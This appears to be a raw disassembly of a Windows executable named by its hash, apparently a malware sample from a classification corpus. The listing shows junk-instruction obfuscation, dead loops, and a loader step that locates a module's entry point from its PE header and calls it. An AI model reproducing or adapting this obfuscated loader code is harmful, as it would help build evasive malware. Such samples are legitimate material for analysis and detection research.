
5a2f78d95d699e529fa3d12f4823ebb1734cc1c0483de3bb7132a5ffbbf32272.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x108
  401009:	push   esi
  40100a:	lea    eax,[ebp-0xc4]
  401010:	push   eax
  401011:	add    DWORD PTR ds:0x435000,0x438000
  40101b:	push   0xf
  40101d:	sub    DWORD PTR ds:0x43701c,0x435018
  401027:	call   DWORD PTR ds:0x43a8d8
  40102d:	xor    DWORD PTR ds:0x434020,0x437010
  401037:	push   0x43a3e4
  40103c:	inc    DWORD PTR ds:0x435010
  401042:	xor    esi,esi
  401044:	inc    esi
  401045:	mov    DWORD PTR ds:0x434000,0x5c4e
  40104f:	push   esi
  401050:	dec    DWORD PTR ds:0x43401c
  401056:	push   esi
  401057:	and    DWORD PTR ds:0x438004,0x43501c
  401061:	call   DWORD PTR ds:0x43a8ec
  401067:	xor    DWORD PTR ds:0x438000,0x435010
  401071:	test   eax,eax
  401073:	mov    DWORD PTR ds:0x436018,0x4ead
  40107d:	je     0x401094
  401083:	xor    eax,eax
  401085:	mov    DWORD PTR ds:0x435008,0x2c45
  40108f:	jmp    0x40258f
  401094:	push   ebx
  401095:	xor    DWORD PTR ds:0x435008,ecx
  40109b:	mov    ebx,DWORD PTR ds:0x43a8cc
  4010a1:	inc    DWORD PTR ds:0x434004
  4010a7:	push   0x9
  4010a9:	add    DWORD PTR ds:0x434024,0x434008
  4010b3:	push   0x43a3fc
  4010b8:	call   ebx
  4010ba:	and    DWORD PTR ds:0x43800c,0x434000
  4010c4:	test   eax,eax
  4010c6:	je     0x4010ef
  4010cc:	sbb    DWORD PTR ds:0x435010,0x438014
  4010d6:	lea    eax,[ebp-0x20]
  4010d9:	push   eax
  4010da:	or     DWORD PTR ds:0x43601c,0x436010
  4010e4:	call   DWORD PTR ds:0x43a8bc
  4010ea:	jmp    0x40258e
  4010ef:	push   edi
  4010f0:	inc    edi
  4010f1:	mov    edi,DWORD PTR ds:0x43a8fc
  4010f7:	push   0x43a418
  4010fc:	adc    DWORD PTR ds:0x43401c,0x6c9b
  401106:	push   esi
  401107:	push   esi
  401108:	or     DWORD PTR ds:0x434018,0x43401c
  401112:	call   edi
  401114:	and    DWORD PTR ds:0x436004,0x434004
  40111e:	test   eax,eax
  401120:	mov    DWORD PTR ds:0x436000,0x329d
  40112a:	jne    0x40241c
  401130:	mov    esi,DWORD PTR ds:0x43a908
  401136:	or     DWORD PTR ds:0x436000,0x434018
  401140:	push   0xd
  401142:	sbb    DWORD PTR ds:0x435000,0x435010
  40114c:	push   0x43a428
  401151:	adc    DWORD PTR ds:0x43601c,0x44f1
  40115b:	call   esi
  40115d:	test   eax,eax
  40115f:	mov    DWORD PTR ds:0x43801c,0x3c7b
  401169:	je     0x401230
  40116f:	or     DWORD PTR ds:0x434028,0x4ff1
  401179:	push   0x43a43c
  40117e:	xor    DWORD PTR ds:0x434004,0x7bc9
  401188:	push   0x1
  40118a:	push   0x1
  40118c:	sub    DWORD PTR ds:0x435014,0x4cb8
  401196:	call   DWORD PTR ds:0x43a8ec
  40119c:	adc    DWORD PTR ds:0x43600c,0x5c72
  4011a6:	test   eax,eax
  4011a8:	jne    0x402440
  4011ae:	push   0x9
  4011b0:	push   0x43a454
  4011b5:	call   ebx
  4011b7:	xor    DWORD PTR ds:0x434020,0x434004
  4011c1:	test   eax,eax
  4011c3:	mov    DWORD PTR ds:0x43501c,0x26a9
  4011cd:	jne    0x40241c
  4011d3:	add    DWORD PTR ds:0x43400c,0x437000
  4011dd:	push   0x43a470
  4011e2:	or     DWORD PTR ds:0x436004,0x437018
  4011ec:	push   0x1
  4011ee:	push   0x1
  4011f0:	call   edi
  4011f2:	xor    DWORD PTR ds:0x43501c,0xa21
  4011fc:	test   eax,eax
  4011fe:	jne    0x40241c
  401204:	and    DWORD PTR ds:0x435014,0x437004
  40120e:	push   0xd
  401210:	push   0x43a480
  401215:	sbb    DWORD PTR ds:0x436010,0x7182
  40121f:	call   esi
  401221:	mov    DWORD PTR ds:0x436004,0x55a5
  40122b:	jmp    0x402440
  401230:	mov    DWORD PTR [ebp-0x10],0x0
  401237:	add    DWORD PTR ds:0x436008,ecx
  40123d:	mov    eax,DWORD PTR [ebp-0x3c]
  401240:	mov    DWORD PTR [ebp-0x3c],eax
  401243:	mov    DWORD PTR [ebp-0x8],0xf89c8585
  40124a:	add    DWORD PTR ds:0x43700c,0x15f
  401254:	mov    DWORD PTR [ebp-0xc],0xf89c8584
  40125b:	lea    eax,[ebp-0x44]
  40125e:	mov    edi,DWORD PTR ds:0x416574
  401264:	mov    ecx,DWORD PTR ds:0x416578
  40126a:	sub    edi,ecx
  40126c:	sub    edi,DWORD PTR [edi+ecx*1]
  40126f:	mov    DWORD PTR [ebp-0x38],eax
  401272:	xor    DWORD PTR ds:0x43500c,ecx
  401278:	lea    eax,[ebp-0x48]
  40127b:	mov    DWORD PTR [ebp-0x18],eax
  40127e:	xor    edi,edi
  401280:	add    edi,DWORD PTR ds:0x434008
  401286:	xor    DWORD PTR ds:0x435014,edi
  40128c:	mov    eax,ds:0x43a2d4
  401291:	mov    eax,DWORD PTR [eax+0x1c8]
  401297:	movzx  esi,BYTE PTR ds:0x43501c
  40129e:	or     esi,DWORD PTR ds:0x437004
  4012a4:	mov    DWORD PTR ds:0x43501c,esi
  4012aa:	mov    eax,DWORD PTR [eax]
  4012ac:	mov    ecx,DWORD PTR [ebp-0x18]
  4012af:	mov    esi,0x751089b
  4012b4:	add    DWORD PTR ds:0x438008,0x58e0
  4012be:	xor    eax,esi
  4012c0:	xor    DWORD PTR ds:0x434008,edi
  4012c6:	mov    edi,0x3272e2
  4012cb:	and    DWORD PTR ds:0x434000,0x437010
  4012d5:	add    eax,edi
  4012d7:	mov    DWORD PTR [ecx],eax
  4012d9:	mov    eax,ds:0x43a724
  4012de:	cmp    eax,0x312bc9f6
  4012e3:	jne    0x401370
  4012e9:	sbb    DWORD PTR ds:0x436010,0x463c
  4012f3:	mov    eax,DWORD PTR [ebp-0x8]
  4012f6:	mov    ecx,DWORD PTR ds:0x43a2d4
  4012fc:	inc    ebx
  4012fd:	mov    ecx,DWORD PTR [ecx+0x198]
  401303:	xor    eax,esi
  401305:	add    DWORD PTR ds:0x43701c,0x3b79
  40130f:	add    eax,edi
  401311:	mov    DWORD PTR [ecx],eax
  401313:	neg    DWORD PTR ds:0x436008
  401319:	mov    eax,DWORD PTR [ebp-0x8]
  40131c:	xor    eax,esi
  40131e:	and    DWORD PTR ds:0x437008,0x0
  401328:	jmp    0x40133a
  40132d:	mov    ebx,DWORD PTR ds:0x437008
  401333:	inc    ebx
  401334:	mov    DWORD PTR ds:0x437008,ebx
  40133a:	cmp    DWORD PTR ds:0x437008,0x12
  401341:	jae    0x401369
  401347:	cmp    DWORD PTR ds:0x437008,0x17
  40134e:	jg     0x401369
  401354:	jmp    0x401364
  401359:	push   0x426b
  40135e:	call   DWORD PTR ds:0x43a8c4
  401364:	jmp    0x40132d
  401369:	add    eax,edi
  40136b:	mov    ds:0x43a724,eax
  401370:	mov    eax,ds:0x43a2d4
  401375:	add    ebx,0x1d59
  40137b:	mov    eax,DWORD PTR [eax+0x18c]
  401381:	mov    eax,DWORD PTR [eax]
  401383:	mov    ebx,DWORD PTR ds:0x416538
  401389:	mov    ebx,DWORD PTR [ebx]
  40138b:	and    DWORD PTR ds:0x436004,ebx
  401391:	mov    DWORD PTR [ebp-0x7c],eax
  401394:	mov    eax,ds:0x416530
  401399:	mov    ebx,DWORD PTR ds:0x4165b8
  40139f:	sub    eax,ebx
  4013a1:	sub    eax,DWORD PTR [eax+ebx*1]
  4013a4:	mov    eax,0xf89c85b9
  4013a9:	mov    DWORD PTR [ebp-0x10],eax
  4013ac:	sbb    DWORD PTR ds:0x43500c,ebx
  4013b2:	mov    DWORD PTR [ebp-0x10],eax
  4013b5:	adc    DWORD PTR ds:0x436008,edx
  4013bb:	mov    DWORD PTR [ebp-0x10],eax
  4013be:	mov    DWORD PTR ds:0x434000,0x12
  4013c8:	cmp    DWORD PTR ds:0x434000,0x0
  4013cf:	je     0x401402
  4013d5:	cmp    DWORD PTR ds:0x434000,0x17
  4013dc:	jg     0x401402
  4013e2:	jmp    0x4013f0
  4013e7:	push   DWORD PTR [ebp-0x14]
  4013ea:	call   DWORD PTR ds:0x43a8c8
  4013f0:	mov    ebx,DWORD PTR ds:0x434000
  4013f6:	dec    ebx
  4013f7:	mov    DWORD PTR ds:0x434000,ebx
  4013fd:	jmp    0x4013c8
  401402:	mov    DWORD PTR [ebp-0x18],0xf89c8585
  401409:	and    DWORD PTR ds:0x436004,0x0
  401413:	jmp    0x401425
  401418:	mov    ebx,DWORD PTR ds:0x436004
  40141e:	inc    ebx
  40141f:	mov    DWORD PTR ds:0x436004,ebx
  401425:	cmp    DWORD PTR ds:0x436004,0x15
  40142c:	jae    0x401454
  401432:	cmp    DWORD PTR ds:0x436004,0x1c
  401439:	ja     0x401454
  40143f:	jmp    0x40144f
  401444:	push   0x43a097
  401449:	call   DWORD PTR ds:0x43a8d0
  40144f:	jmp    0x401418
  401454:	mov    DWORD PTR [ebp-0x10],eax
  401457:	adc    ebx,0x4a4f
  40145d:	mov    DWORD PTR [ebp-0x10],0xf89c85bd
  401464:	movzx  ebx,WORD PTR ds:0x434000
  40146b:	xor    ebx,DWORD PTR ds:0x438000
  401471:	mov    DWORD PTR ds:0x434000,ebx
  401477:	mov    ebx,DWORD PTR [ebp-0x8]
  40147a:	xor    ebx,esi
  40147c:	or     DWORD PTR ds:0x436000,0x43801c
  401486:	add    ebx,edi
  401488:	mov    DWORD PTR ds:0x434004,0x16bd
  401492:	jmp    0x401599
  401497:	adc    eax,DWORD PTR ds:0x437010
  40149d:	mov    eax,DWORD PTR [ebp-0xc]
  4014a0:	add    DWORD PTR ds:0x43600c,0x435004
  4014aa:	xor    eax,esi
  4014ac:	sub    DWORD PTR ds:0x434024,0x438008
  4014b6:	lea    eax,[eax+ebx*1+0x3272e2]
  4014bd:	or     DWORD PTR ds:0x43401c,0x36
  4014c7:	push   eax
  4014c8:	neg    DWORD PTR ds:0x43401c
  4014ce:	mov    eax,DWORD PTR [ebp-0x18]
  4014d1:	xor    eax,esi
  4014d3:	adc    DWORD PTR ds:0x437004,0x7bd1
  4014dd:	lea    eax,[ebp+eax*1+0x3272ea]
  4014e4:	or     DWORD PTR ds:0x434028,0x5a2b
  4014ee:	push   eax
  4014ef:	and    DWORD PTR ds:0x435010,0x0
  4014f9:	jmp    0x401509
  4014fe:	mov    eax,ds:0x435010
  401503:	inc    eax
  401504:	mov    ds:0x435010,eax
  401509:	cmp    DWORD PTR ds:0x435010,0x1b
  401510:	jae    0x401550
  401516:	cmp    DWORD PTR ds:0x435010,0x8
  40151d:	jl     0x401550
  401523:	jmp    0x401533
  401528:	push   0x43a111
  40152d:	call   DWORD PTR ds:0x43a8d4
  401533:	cmp    DWORD PTR ds:0x435010,0x7
  40153a:	jne    0x40154b
  401540:	mov    eax,ds:0x435010
  401545:	inc    eax
  401546:	mov    ds:0x435010,eax
  40154b:	jmp    0x4014fe
  401550:	mov    eax,ds:0x43a2d4
  401555:	sub    DWORD PTR ds:0x438000,0x71a4
  40155f:	push   DWORD PTR [eax+0x1bc]
  401565:	adc    DWORD PTR ds:0x436008,0x7f70
  40156f:	call   0x402598
  401574:	movzx  ecx,BYTE PTR ds:0x434020
  40157b:	sbb    DWORD PTR ds:0x434008,ecx
  401581:	mov    eax,DWORD PTR [ebp-0xc]
  401584:	adc    ecx,DWORD PTR ds:0x438018
  40158a:	xor    eax,esi
  40158c:	sbb    ecx,DWORD PTR ds:0x437000
  401592:	lea    ebx,[ebx+eax*1+0x3272e2]
  401599:	mov    ecx,DWORD PTR ds:0x434018
  40159f:	add    DWORD PTR ds:0x436000,ecx
  4015a5:	mov    eax,DWORD PTR [ebp-0xc]
  4015a8:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ab:	adc    DWORD PTR ds:0x43801c,0x43400c
  4015b5:	xor    ecx,esi
  4015b7:	xor    DWORD PTR ds:0x43800c,0x6ae7
  4015c1:	xor    eax,esi
  4015c3:	add    eax,ecx
  4015c5:	xor    ecx,0x639d
  4015cb:	mov    ecx,DWORD PTR [ebp-0xc]
  4015ce:	sbb    DWORD PTR ds:0x437004,0x435008
  4015d8:	xor    ecx,esi
  4015da:	lea    eax,[eax+ecx*1+0x9758a6]
  4015e1:	mov    DWORD PTR ds:0x437018,0x6f5b
  4015eb:	cmp    ebx,eax
  4015ed:	jbe    0x401497
  4015f3:	mov    eax,DWORD PTR [ebp+0xc]
  4015f6:	and    DWORD PTR ds:0x43601c,ebx
  4015fc:	mov    ds:0x43a158,eax
  401601:	mov    eax,DWORD PTR [ebp+0x10]
  401604:	mov    DWORD PTR ds:0x435004,0xee9
  40160e:	mov    ds:0x43a3ac,eax
  401613:	sbb    DWORD PTR ds:0x436000,ebx
  401619:	mov    eax,ds:0x43a158
  40161e:	neg    ecx
  401620:	mov    ecx,DWORD PTR [ebp-0x38]
  401623:	sub    eax,edi
  401625:	xor    eax,esi
  401627:	mov    DWORD PTR ds:0x438010,0x5a04
  401631:	mov    DWORD PTR [ecx],eax
  401633:	mov    DWORD PTR ds:0x438010,ecx
  401639:	mov    eax,DWORD PTR [ebp-0x3c]
  40163c:	mov    DWORD PTR ds:0x43701c,0x1a94
  401646:	cmp    eax,0xf89c8585
  40164b:	mov    DWORD PTR ds:0x43501c,0x7d63
  401655:	jne    0x401b36
  40165b:	or     DWORD PTR ds:0x43400c,0x43501c
  401665:	push   0x43a494
  40166a:	xor    ebx,ebx
  40166c:	mov    DWORD PTR ds:0x43700c,0x6301
  401676:	inc    ebx
  401677:	and    DWORD PTR ds:0x437014,0x438000
  401681:	push   ebx
  401682:	push   ebx
  401683:	adc    DWORD PTR ds:0x436010,0x6629
  40168d:	call   DWORD PTR ds:0x43a8ec
  401693:	or     DWORD PTR ds:0x435008,0x107f
  40169d:	test   eax,eax
  40169f:	jne    0x402440
  4016a5:	xor    DWORD PTR ds:0x434014,0x437000
  4016af:	push   0x9
  4016b1:	push   0x43a4ac
  4016b6:	xor    DWORD PTR ds:0x43701c,0x434028
  4016c0:	call   DWORD PTR ds:0x43a8cc
  4016c6:	test   eax,eax
  4016c8:	jne    0x40241c
  4016ce:	adc    DWORD PTR ds:0x438010,0x6458
  4016d8:	push   0x43a4c8
  4016dd:	push   ebx
  4016de:	push   ebx
  4016df:	call   DWORD PTR ds:0x43a8fc
  4016e5:	test   eax,eax
  4016e7:	mov    DWORD PTR ds:0x434014,0x6a9b
  4016f1:	jne    0x40241c
  4016f7:	add    DWORD PTR ds:0x434018,0x437004
  401701:	push   0xd
  401703:	neg    DWORD PTR ds:0x438004
  401709:	push   0x43a4d8
  40170e:	and    DWORD PTR ds:0x435010,0x62ab
  401718:	call   DWORD PTR ds:0x43a908
  40171e:	or     DWORD PTR ds:0x435008,0x43600c
  401728:	test   eax,eax
  40172a:	jne    0x402440
  401730:	sbb    DWORD PTR ds:0x436010,0x438018
  40173a:	lea    eax,[ebp-0x34]
  40173d:	sub    DWORD PTR ds:0x43500c,0x6999
  401747:	mov    DWORD PTR [ebp-0x9c],eax
  40174d:	lea    eax,[ebp+0x4]
  401750:	or     DWORD PTR ds:0x43700c,0x43601c
  40175a:	mov    DWORD PTR [ebp-0x34],eax
  40175d:	xor    eax,DWORD PTR ds:0x43600c
  401763:	mov    eax,DWORD PTR [ebp-0x34]
  401766:	and    DWORD PTR ds:0x43401c,0x436018
  401770:	test   eax,eax
  401772:	je     0x402572
  401778:	xor    eax,ecx
  40177a:	mov    eax,DWORD PTR [ebp-0x28]
  40177d:	mov    eax,DWORD PTR [ebp-0xc]
  401780:	xor    DWORD PTR ds:0x434008,0x3c87
  40178a:	mov    eax,DWORD PTR [ebp-0x8]
  40178d:	and    DWORD PTR ds:0x434008,0x0
  401797:	xor    ecx,ecx
  401799:	add    ecx,DWORD PTR ds:0x434008
  40179f:	inc    ecx
  4017a0:	mov    DWORD PTR ds:0x434008,ecx
  4017a6:	cmp    DWORD PTR ds:0x434008,0x23
  4017ad:	jbe    0x4017ce
  4017b3:	jmp    0x4017c1
  4017b8:	push   DWORD PTR [ebp-0x20]
  4017bb:	call   DWORD PTR ds:0x43a8dc
  4017c1:	cmp    DWORD PTR ds:0x434008,0x15
  4017c8:	jb     0x401797
  4017ce:	mov    DWORD PTR [ebp+0xc],eax
  4017d1:	mov    DWORD PTR ds:0x43400c,0x1d
  4017db:	cmp    DWORD PTR ds:0x43400c,0x0
  4017e2:	je     0x40183c
  4017e8:	cmp    DWORD PTR ds:0x43400c,0x3
  4017ef:	ja     0x40183c
  4017f5:	jmp    0x40180e
  4017fa:	push   0x43a0c9
  4017ff:	push   DWORD PTR [ebp-0x18]
  401802:	push   DWORD PTR [ebp-0x28]
  401805:	push   DWORD PTR [ebp-0x1c]
  401808:	call   DWORD PTR ds:0x43a8e0
  40180e:	cmp    DWORD PTR ds:0x43400c,0x4
  401815:	jne    0x40182a
  40181b:	xor    ecx,ecx
  40181d:	add    ecx,DWORD PTR ds:0x43400c
  401823:	dec    ecx
  401824:	mov    DWORD PTR ds:0x43400c,ecx
  40182a:	mov    ecx,DWORD PTR ds:0x43400c
  401830:	dec    ecx
  401831:	mov    DWORD PTR ds:0x43400c,ecx
  401837:	jmp    0x4017db
  40183c:	mov    eax,eax
  40183e:	and    DWORD PTR ds:0x43401c,0x0
  401848:	jmp    0x40185c
  40184d:	xor    ecx,ecx
  40184f:	add    ecx,DWORD PTR ds:0x43401c
  401855:	inc    ecx
  401856:	mov    DWORD PTR ds:0x43401c,ecx
  40185c:	cmp    DWORD PTR ds:0x43401c,0x14
  401863:	jae    0x4018b6
  401869:	cmp    DWORD PTR ds:0x43401c,0x9
  401870:	jge    0x4018b6
  401876:	jmp    0x401897
  40187b:	push   DWORD PTR [ebp-0x14]
  40187e:	push   0x434004
  401883:	push   DWORD PTR [ebp-0x24]
  401886:	push   0x43a07b
  40188b:	push   DWORD PTR [ebp-0x20]
  40188e:	push   DWORD PTR [ebp-0x18]
  401891:	call   DWORD PTR ds:0x43a8e4
  401897:	cmp    DWORD PTR ds:0x43401c,0x8
  40189e:	jne    0x4018b1
  4018a4:	mov    ecx,DWORD PTR ds:0x43401c
  4018aa:	inc    ecx
  4018ab:	mov    DWORD PTR ds:0x43401c,ecx
  4018b1:	jmp    0x40184d
  4018b6:	mov    eax,ds:0x43a2d4
  4018bb:	or     DWORD PTR ds:0x434008,0x6b78
  4018c5:	mov    eax,DWORD PTR [eax+0x1c8]
  4018cb:	mov    eax,DWORD PTR [eax]
  4018cd:	mov    DWORD PTR ds:0x43400c,0x1f
  4018d7:	cmp    DWORD PTR ds:0x43400c,0x0
  4018de:	je     0x40191e
  4018e4:	cmp    DWORD PTR ds:0x43400c,0x21
  4018eb:	jbe    0x40191e
  4018f1:	jmp    0x40190a
  4018f6:	push   0x1259
  4018fb:	push   DWORD PTR [ebp-0x10]
  4018fe:	push   DWORD PTR [ebp-0x28]
  401901:	push   DWORD PTR [ebp-0xc]
  401904:	call   DWORD PTR ds:0x43a8e8
  40190a:	xor    ecx,ecx
  40190c:	xor    ecx,DWORD PTR ds:0x43400c
  401912:	dec    ecx
  401913:	mov    DWORD PTR ds:0x43400c,ecx
  401919:	jmp    0x4018d7
  40191e:	cdq    
  40191f:	mov    ebx,eax
  401921:	mov    DWORD PTR ds:0x435000,0x1d
  40192b:	cmp    DWORD PTR ds:0x435000,0x0
  401932:	je     0x401964
  401938:	cmp    DWORD PTR ds:0x435000,0x28
  40193f:	ja     0x401964
  401945:	jmp    0x401950
  40194a:	call   DWORD PTR ds:0x43a8f0
  401950:	xor    ecx,ecx
  401952:	add    ecx,DWORD PTR ds:0x435000
  401958:	dec    ecx
  401959:	mov    DWORD PTR ds:0x435000,ecx
  40195f:	jmp    0x40192b
  401964:	mov    eax,0xfabdbee7
  401969:	add    ebx,eax
  40196b:	mov    DWORD PTR ds:0x43501c,ebx
  401971:	adc    edx,0xffffffff
  401974:	and    ecx,DWORD PTR ds:0x434018
  40197a:	and    DWORD PTR [ebp-0x10],0x0
  40197e:	xor    edx,0x0
  401981:	mov    DWORD PTR [ebp-0x6c],edx
  401984:	mov    edx,DWORD PTR [ebp+0xc]
  401987:	mov    DWORD PTR [ebp-0x14],edx
  40198a:	and    ecx,edx
  40198c:	mov    ecx,0x8a29a12d
  401991:	and    DWORD PTR ds:0x437018,0x6956
  40199b:	xor    ebx,ecx
  40199d:	add    DWORD PTR [ebp-0x14],eax
  4019a0:	mov    edx,DWORD PTR [ebp-0x14]
  4019a3:	mov    DWORD PTR ds:0x437018,0xe51
  4019ad:	adc    DWORD PTR [ebp-0x10],0xffffffff
  4019b1:	adc    DWORD PTR ds:0x43401c,0x434014
  4019bb:	xor    edx,ecx
  4019bd:	sub    DWORD PTR ds:0x438018,0x437000
  4019c7:	mov    DWORD PTR [ebp-0x5c],edx
  4019ca:	mov    edx,DWORD PTR [ebp-0x10]
  4019cd:	xor    edx,0x0
  4019d0:	mov    DWORD PTR [ebp-0x58],edx
  4019d3:	mov    DWORD PTR ds:0x43600c,0x7e33
  4019dd:	cmp    DWORD PTR [ebp-0x5c],ebx
  4019e0:	mov    DWORD PTR ds:0x434010,0x71c9
  4019ea:	jne    0x401a0c
  4019f0:	mov    edx,DWORD PTR ds:0x434004
  4019f6:	mov    edx,DWORD PTR [ebp-0x6c]
  4019f9:	cmp    DWORD PTR [ebp-0x58],edx
  4019fc:	mov    DWORD PTR ds:0x43600c,0x7cc1
  401a06:	je     0x401aa7
  401a0c:	mov    DWORD PTR ds:0x434018,0x1c
  401a16:	cmp    DWORD PTR ds:0x434018,0x0
  401a1d:	je     0x401a50
  401a23:	cmp    DWORD PTR ds:0x434018,0x29
  401a2a:	jbe    0x401a50
  401a30:	jmp    0x401a3e
  401a35:	push   DWORD PTR [ebp-0x28]
  401a38:	call   DWORD PTR ds:0x43a8f4
  401a3e:	mov    edx,DWORD PTR ds:0x434018
  401a44:	dec    edx
  401a45:	mov    DWORD PTR ds:0x434018,edx
  401a4b:	jmp    0x401a16
  401a50:	mov    edx,DWORD PTR ds:0x43a2d4
  401a56:	or     DWORD PTR ds:0x436018,0x438010
  401a60:	mov    edx,DWORD PTR [edx+0x1c0]
  401a66:	add    DWORD PTR ds:0x434018,0x436004
  401a70:	mov    edx,DWORD PTR [edx]
  401a72:	xor    ebx,ebx
  401a74:	add    edx,eax
  401a76:	adc    ebx,0xffffffff
  401a79:	xor    edx,ecx
  401a7b:	xor    ebx,0x0
  401a7e:	cmp    edx,0x70941fc5
  401a84:	mov    DWORD PTR ds:0x438014,0x6222
  401a8e:	jne    0x402572
  401a94:	cmp    ebx,0xffffffff
  401a97:	mov    DWORD PTR ds:0x436010,0x168c
  401aa1:	jne    0x402572
  401aa7:	mov    edx,DWORD PTR ds:0x43a350
  401aad:	or     DWORD PTR ds:0x43501c,0x338f
  401ab7:	mov    ebx,DWORD PTR ds:0x43a358
  401abd:	sbb    DWORD PTR ds:0x43501c,0x434008
  401ac7:	xor    edx,ebx
  401ac9:	and    DWORD PTR ds:0x438000,0x0
  401ad3:	jmp    0x401ae5
  401ad8:	mov    ebx,DWORD PTR ds:0x438000
  401ade:	inc    ebx
  401adf:	mov    DWORD PTR ds:0x438000,ebx
  401ae5:	cmp    DWORD PTR ds:0x438000,0x1a
  401aec:	jae    0x401b17
  401af2:	cmp    DWORD PTR ds:0x438000,0x29
  401af9:	jl     0x401b17
  401aff:	jmp    0x401b12
  401b04:	push   0x4320
  401b09:	push   DWORD PTR [ebp-0x28]
  401b0c:	call   DWORD PTR ds:0x43a8f8
  401b12:	jmp    0x401ad8
  401b17:	mov    DWORD PTR ds:0x43a350,edx
  401b1d:	mov    edx,DWORD PTR [ebp-0x34]
  401b20:	mov    ebx,DWORD PTR ds:0x43a350
  401b26:	add    ebx,DWORD PTR [edx]
  401b28:	not    DWORD PTR ds:0x43801c
  401b2e:	mov    edx,DWORD PTR [ebp-0x34]
  401b31:	jmp    0x402531
  401b36:	mov    eax,DWORD PTR [ebp-0x44]
  401b39:	mov    DWORD PTR ds:0x436000,0x3783
  401b43:	cmp    eax,0xf89c8584
  401b48:	mov    DWORD PTR ds:0x434000,0x66dd
  401b52:	je     0x401d61
  401b58:	xor    eax,eax
  401b5a:	xor    eax,DWORD PTR ds:0x434018
  401b60:	adc    eax,DWORD PTR ds:0x434024
  401b66:	mov    ds:0x434018,eax
  401b6b:	mov    eax,DWORD PTR [ebp-0x8]
  401b6e:	mov    ecx,DWORD PTR [ebp-0x48]
  401b71:	xor    eax,esi
  401b73:	add    eax,edi
  401b75:	mov    DWORD PTR ds:0x436004,0x39e8
  401b7f:	cmp    eax,ecx
  401b81:	mov    DWORD PTR ds:0x434018,0x5d7a
  401b8b:	je     0x401d61
  401b91:	xor    DWORD PTR ds:0x434000,0x3742
  401b9b:	push   0x43a5f4
  401ba0:	xor    esi,esi
  401ba2:	inc    esi
  401ba3:	sbb    DWORD PTR ds:0x43801c,0x434008
  401bad:	push   esi
  401bae:	sub    DWORD PTR ds:0x43701c,0x437018
  401bb8:	push   esi
  401bb9:	adc    DWORD PTR ds:0x436004,0x30fb
  401bc3:	call   DWORD PTR ds:0x43a8ec
  401bc9:	or     DWORD PTR ds:0x435000,0x43400c
  401bd3:	test   eax,eax
  401bd5:	mov    DWORD PTR ds:0x437010,0x752e
  401bdf:	jne    0x402440
  401be5:	mov    DWORD PTR ds:0x43501c,0xd2c
  401bef:	push   0x9
  401bf1:	add    DWORD PTR ds:0x43500c,0x3ba4
  401bfb:	push   0x43a60c
  401c00:	call   DWORD PTR ds:0x43a8cc
  401c06:	test   eax,eax
  401c08:	jne    0x40241c
  401c0e:	and    DWORD PTR ds:0x43401c,0x438010
  401c18:	push   0x43a628
  401c1d:	push   esi
  401c1e:	push   esi
  401c1f:	sbb    DWORD PTR ds:0x436000,0x437014
  401c29:	call   DWORD PTR ds:0x43a8fc
  401c2f:	or     DWORD PTR ds:0x43400c,0x434020
  401c39:	test   eax,eax
  401c3b:	mov    DWORD PTR ds:0x438018,0x4ca0
  401c45:	jne    0x40241c
  401c4b:	push   0xd
  401c4d:	add    DWORD PTR ds:0x437000,0x43400c
  401c57:	push   0x43a638
  401c5c:	call   DWORD PTR ds:0x43a908
  401c62:	add    DWORD PTR ds:0x437018,0x7176
  401c6c:	test   eax,eax
  401c6e:	jne    0x402440
  401c74:	mov    DWORD PTR ds:0x436000,0x1e
  401c7e:	cmp    DWORD PTR ds:0x436000,0x0
  401c85:	je     0x401cd4
  401c8b:	cmp    DWORD PTR ds:0x436000,0x10
  401c92:	jle    0x401cd4
  401c98:	jmp    0x401ca8
  401c9d:	push   0x435014
  401ca2:	call   DWORD PTR ds:0x43a900
  401ca8:	cmp    DWORD PTR ds:0x436000,0x11
  401caf:	jne    0x401cc2
  401cb5:	mov    ecx,DWORD PTR ds:0x436000
  401cbb:	dec    ecx
  401cbc:	mov    DWORD PTR ds:0x436000,ecx
  401cc2:	mov    ecx,DWORD PTR ds:0x436000
  401cc8:	dec    ecx
  401cc9:	mov    DWORD PTR ds:0x436000,ecx
  401ccf:	jmp    0x401c7e
  401cd4:	mov    eax,ds:0x43a2d4
  401cd9:	mov    ecx,DWORD PTR ds:0x435004
  401cdf:	or     DWORD PTR ds:0x438010,ecx
  401ce5:	mov    eax,DWORD PTR [eax+0x194]
  401ceb:	mov    ecx,DWORD PTR [eax]
  401ced:	mov    eax,DWORD PTR [ecx+0x3c]
  401cf0:	push   DWORD PTR ds:0x43a3ac
  401cf6:	mov    DWORD PTR ds:0x435014,0x6873
  401d00:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  401d04:	push   DWORD PTR ds:0x43a158
  401d0a:	mov    DWORD PTR ds:0x43400c,0x7a94
  401d14:	add    eax,ecx
  401d16:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d1c:	or     DWORD PTR ds:0x437010,0x5a23
  401d26:	mov    ecx,DWORD PTR [ecx+0x194]
  401d2c:	mov    DWORD PTR ds:0x436008,0x65e8
  401d36:	push   DWORD PTR [ecx]
  401d38:	sbb    DWORD PTR ds:0x43401c,0x5228
  401d42:	call   eax
  401d44:	mov    ecx,DWORD PTR ds:0x43a2d4
  401d4a:	mov    ecx,DWORD PTR [ecx+0x1cc]
  401d50:	mov    DWORD PTR ds:0x437014,0xc7a
  401d5a:	mov    DWORD PTR [ecx],eax
  401d5c:	jmp    0x402572
  401d61:	adc    DWORD PTR ds:0x43700c,0x4142
  401d6b:	push   0x43a4ec
  401d70:	adc    DWORD PTR ds:0x435008,0x3813
  401d7a:	xor    ebx,ebx
  401d7c:	sbb    DWORD PTR ds:0x43801c,0x3514
  401d86:	inc    ebx
  401d87:	not    DWORD PTR ds:0x435008
  401d8d:	push   ebx
  401d8e:	push   ebx
  401d8f:	call   DWORD PTR ds:0x43a8ec
  401d95:	or     DWORD PTR ds:0x436010,0x434018
  401d9f:	test   eax,eax
  401da1:	mov    DWORD PTR ds:0x437008,0x71b6
  401dab:	jne    0x402440
  401db1:	or     DWORD PTR ds:0x438010,0x434014
  401dbb:	push   0x9
  401dbd:	add    DWORD PTR ds:0x437008,0x6ead
  401dc7:	push   0x43a504
  401dcc:	add    DWORD PTR ds:0x437010,0x12d1
  401dd6:	call   DWORD PTR ds:0x43a8cc
  401ddc:	add    DWORD PTR ds:0x434014,0x5154
  401de6:	test   eax,eax
  401de8:	mov    DWORD PTR ds:0x43600c,0xb65
  401df2:	jne    0x40241c
